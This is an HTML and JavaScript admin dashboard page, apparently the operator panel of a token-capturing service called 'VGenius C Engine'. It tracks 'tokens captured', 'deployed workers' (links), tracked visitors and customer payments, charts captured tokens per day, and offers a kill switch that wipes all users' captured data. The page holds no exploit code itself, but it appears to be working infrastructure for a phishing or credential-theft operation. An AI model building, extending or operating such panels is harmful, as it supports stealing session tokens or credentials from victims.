<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard – VGenius C Engine</title>
    <link rel="stylesheet" href="assets/css/admin.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        .dashboard-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-bottom: 24px; }
        .dashboard-card { background: var(--surface); border: 1px solid var(--border); border-radius: 14px; padding: 20px; }
        .dashboard-card h3 { font-family: 'JetBrains Mono', monospace; font-size: 11px; letter-spacing: 0.08em; color: var(--accent); margin-bottom: 12px; text-transform: uppercase; }
        .chart-container { height: 200px; }
        .activity-list { max-height: 300px; overflow-y: auto; }
        .activity-item { padding: 10px 0; border-bottom: 1px solid var(--border); font-size: 12px; }
        .activity-item:last-child { border-bottom: none; }
        .activity-time { color: var(--muted); font-size: 10px; }
        @media (max-width: 768px) { .dashboard-grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <div class="app-layout">
        <aside class="main-sidebar" id="adminMainSidebar"></aside>
        <div class="sidebar-overlay" id="adminSidebarOverlay" onclick="toggleAdminSidebar()"></div>
        <nav class="main-header navbar"></nav>

        <main class="main-content">
            <div class="page-header">
                <h1 class="page-title">Dashboard</h1>
                <div style="display:flex;gap:8px;">
                    <button class="btn-sm" onclick="refreshDashboard()"><i class="fas fa-sync"></i> Refresh</button>
                    <button class="btn-sm accent" onclick="openDiagnostics()"><i class="fas fa-stethoscope"></i> Diagnostics</button>
                </div>
            </div>

            <div class="dashboard-grid">
                <div class="dashboard-card">
                    <h3><i class="fas fa-users"></i> Users</h3>
                    <div style="font-family:'JetBrains Mono',monospace;font-size:32px;font-weight:700;" id="dashUsers">—</div>
                    <div style="font-size:11px;color:var(--muted);margin-top:4px;"><span id="dashActiveUsers" style="color:var(--accent);">—</span> active</div>
                </div>
                <div class="dashboard-card">
                    <h3><i class="fas fa-key"></i> Tokens</h3>
                    <div style="font-family:'JetBrains Mono',monospace;font-size:32px;font-weight:700;" id="dashTokens">—</div>
                    <div style="font-size:11px;color:var(--muted);margin-top:4px;">Total captured</div>
                </div>
                <div class="dashboard-card">
                    <h3><i class="fas fa-link"></i> Active Links</h3>
                    <div style="font-family:'JetBrains Mono',monospace;font-size:32px;font-weight:700;" id="dashLinks">—</div>
                    <div style="font-size:11px;color:var(--muted);margin-top:4px;">Deployed workers</div>
                </div>
                <div class="dashboard-card">
                    <h3><i class="fas fa-dollar-sign"></i> Payments</h3>
                    <div style="font-family:'JetBrains Mono',monospace;font-size:32px;font-weight:700;color:var(--warning);" id="dashPayments">—</div>
                    <div style="font-size:11px;color:var(--muted);margin-top:4px;">Pending confirmation</div>
                </div>
                <div class="dashboard-card">
                    <h3><i class="fas fa-users"></i> Visitors</h3>
                    <div style="font-family:'JetBrains Mono',monospace;font-size:32px;font-weight:700;" id="dashVisitors">—</div>
                    <div style="font-size:11px;color:var(--muted);margin-top:4px;">Total tracked</div>
                </div>
                <div class="dashboard-card">
                    <h3><i class="fas fa-bolt"></i> Quick Actions</h3>
                    <div style="display:flex;flex-direction:column;gap:8px;margin-top:8px;">
                        <button class="btn-sm" style="width:100%;" onclick="execCommand('/killswitch_global')">Global Kill Switch</button>
                        <button class="btn-sm" id="maintenanceToggle" style="width:100%;" onclick="toggleMaintenance()">
                            <i class="fas fa-tools"></i> <span id="maintenanceText">Loading...</span>
                        </button>
                        <button class="btn-sm" style="width:100%;" onclick="downloadBackup()"><i class="fas fa-download"></i> Backup Data</button>
                    </div>
                </div>
            </div>

            <div class="dashboard-grid" style="grid-template-columns:2fr 1fr;">
                <div class="dashboard-card">
                    <h3><i class="fas fa-chart-line"></i> Token Trends (30 Days)</h3>
                    <div class="chart-container">
                        <canvas id="tokenChart"></canvas>
                    </div>
                </div>
                <div class="dashboard-card">
                    <h3><i class="fas fa-clock"></i> Recent Activity</h3>
                    <div class="activity-list" id="activityList">
                        <div class="activity-item"><div class="activity-time">Loading...</div></div>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script src="assets/js/admin.js"></script>
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <script>
        initAdminShared('dashboard');
        let chartInstance = null;

        async function loadDashboard() {
            try {
                const res = await fetch('/api/admin/dashboard', { headers: adminHeaders() });
                const d = await res.json();
                document.getElementById('dashUsers').textContent = d.total_users || 0;
                document.getElementById('dashActiveUsers').textContent = d.active_users || 0;
                document.getElementById('dashTokens').textContent = d.total_tokens || 0;
                document.getElementById('dashLinks').textContent = d.active_links || 0;
                document.getElementById('dashPayments').textContent = d.pending_payments || 0;
                document.getElementById('dashVisitors').textContent = d.total_visitors || 0;
            } catch (e) {  }
        }

        async function loadAnalytics() {
            try {
                const res = await fetch('/api/admin/analytics', { headers: adminHeaders() });
                const data = await res.json();
                renderChart(data.tokens_by_day);
            } catch (e) {  }
        }

        function renderChart(data) {
            const ctx = document.getElementById('tokenChart');
            if (!ctx) return;
            if (chartInstance) chartInstance.destroy();
            if (!data || !data.length) {
                ctx.getContext('2d').fillText('No data available', 50, 100);
                return;
            }
            chartInstance = new Chart(ctx.getContext('2d'), {
                type: 'line',
                data: {
                    labels: data.map(d => d.date),
                    datasets: [{
                        label: 'Tokens Captured',
                        data: data.map(d => d.count || 0),
                        borderColor: '#00ff66',
                        backgroundColor: 'rgba(0,255,102,0.08)',
                        fill: true,
                        tension: 0.4,
                        pointRadius: 2,
                        pointBackgroundColor: '#00ff66',
                        borderWidth: 2
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: { legend: { display: false } },
                    scales: {
                        x: { ticks: { color: '#71717a', font: { size: 10 } }, grid: { color: 'rgba(255,255,255,0.03)' } },
                        y: { beginAtZero: true, ticks: { color: '#71717a', font: { size: 10 } }, grid: { color: 'rgba(255,255,255,0.03)' } }
                    }
                }
            });
        }

        async function loadActivity() {
            try {
                const res = await fetch('/api/admin/audit', { headers: adminHeaders() });
                const data = await res.json();
                const list = document.getElementById('activityList');
                if (!data || !data.length) {
                    list.innerHTML = '<div class="activity-item"><div class="activity-time">No activity yet</div></div>';
                    return;
                }
                list.innerHTML = data.slice(0, 20).map(e => `
                    <div class="activity-item">
                        <div style="color:var(--text);">${e.action || '—'}</div>
                        <div class="activity-time">${timeAgo(e.created_at)} · ${e.ip_address || '—'}</div>
                    </div>
                `).join('');
            } catch (e) {  }
        }

        async function execCommand(cmd) {
            const commands = {
                '/killswitch_global': async () => {
                    showConfirm({
                        title: 'Global Kill Switch',
                        message: 'Permanently DELETE every user account and all of their data (links, captured tokens, visitors, sessions, payments). Only the admin account survives. This cannot be undone.',
                        confirmText: 'Wipe All Users',
                        onConfirm: async () => {
                            if (await globalWipe()) loadDashboard();
                        }
                    });
                },
                '/maintenance_on': async () => {
                    await fetch('/api/admin/settings', { method: 'PUT', headers: adminHeaders(), body: JSON.stringify({ maintenance_mode: 'true' }) });
                    showToast('Maintenance mode ON');
                },
                '/maintenance_off': async () => {
                    await fetch('/api/admin/settings', { method: 'PUT', headers: adminHeaders(), body: JSON.stringify({ maintenance_mode: 'false' }) });
                    showToast('Maintenance mode OFF');
                },
            };
            if (commands[cmd]) {
                await commands[cmd]();
            } else {
                showToast('Unknown command: ' + cmd, true);
            }
        }

        async function refreshDashboard() {
            await Promise.all([loadDashboard(), loadAnalytics(), loadActivity()]);
            showToast('Dashboard refreshed');
        }

        async function downloadBackup() {
            try {
                const res = await fetch('/api/admin/backup', { headers: adminHeaders() });
                if (!res.ok) {
                    const err = await res.json();
                    showToast(err.error || 'Backup failed', true);
                    return;
                }
                const blob = await res.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'backup-' + Date.now() + '.json';
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                showToast('Backup downloaded successfully');
            } catch (e) {
                showToast('Backup failed: ' + e.message, true);
            }
        }

        async function openDiagnostics() {
            try {
                const res = await fetch('/api/admin/diagnostics', { headers: adminHeaders() });
                const data = await res.json();

                let html = '<div class="modal-overlay-custom" onclick="this.remove()">';
                html += '<div class="modal-card-custom" style="max-width:500px;" onclick="event.stopPropagation()">';
                html += '<h3><i class="fas fa-stethoscope" style="color:var(--accent);margin-right:8px;"></i> System Diagnostics</h3>';
                html += '<div style="margin-top:16px;">';

                for (const [key, value] of Object.entries(data)) {
                    const status = String(value).startsWith('OK') ? 'success' : (String(value).startsWith('FAIL') ? 'error' : 'info');
                    const icon = status === 'success' ? 'fa-check-circle' : (status === 'error' ? 'fa-times-circle' : 'fa-info-circle');
                    const color = status === 'success' ? 'var(--accent)' : (status === 'error' ? '#ef4444' : 'var(--muted)');

                    html += '<div style="display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border);">';
                    html += '<span style="text-transform:capitalize;font-size:12px;color:var(--text-muted);">' + key.replace(/_/g, ' ') + '</span>';
                    html += '<span style="font-size:12px;color:' + color + ';font-family:var(--font-heading);"><i class="fas ' + icon + '" style="margin-right:6px;"></i>' + value + '</span>';
                    html += '</div>';
                }

                html += '</div>';
                html += '<button class="btn-sm" style="width:100%;margin-top:16px;" onclick="this.closest(\'.modal-overlay-custom\').remove()">Close</button>';
                html += '</div></div>';

                document.body.insertAdjacentHTML('beforeend', html);
            } catch (e) {
                showToast('Diagnostics failed: ' + e.message, true);
            }
        }

        async function loadMaintenanceState() {
            try {
                const res = await fetch('/api/admin/settings', { headers: adminHeaders() });
                const data = await res.json();
                const isMaintenance = data.maintenance_mode === 'true';
                updateMaintenanceUI(isMaintenance);
            } catch (e) {
                
            }
        }

        async function toggleMaintenance() {
            try {
                const res = await fetch('/api/admin/settings', { headers: adminHeaders() });
                const data = await res.json();
                const isMaintenance = data.maintenance_mode === 'true';
                const newState = isMaintenance ? 'false' : 'true';

                await fetch('/api/admin/settings', {
                    method: 'PUT',
                    headers: adminHeaders(),
                    body: JSON.stringify({ maintenance_mode: newState })
                });

                updateMaintenanceUI(!isMaintenance);
                showToast(isMaintenance ? 'Maintenance mode OFF' : 'Maintenance mode ON');
            } catch (e) {
                showToast('Failed to toggle maintenance: ' + e.message, true);
            }
        }

        function updateMaintenanceUI(isOn) {
            const btn = document.getElementById('maintenanceToggle');
            const text = document.getElementById('maintenanceText');
            if (!btn || !text) return;

            if (isOn) {
                btn.style.background = 'rgba(245, 158, 11, 0.15)';
                btn.style.borderColor = 'rgba(245, 158, 11, 0.3)';
                btn.style.color = '#f59e0b';
                text.textContent = 'Maintenance ON';
            } else {
                btn.style.background = '';
                btn.style.borderColor = '';
                btn.style.color = '';
                text.textContent = 'Maintenance OFF';
            }
        }

        loadDashboard();
        loadAnalytics();
        loadActivity();
        loadMaintenanceState();
    </script>
</body>
</html>
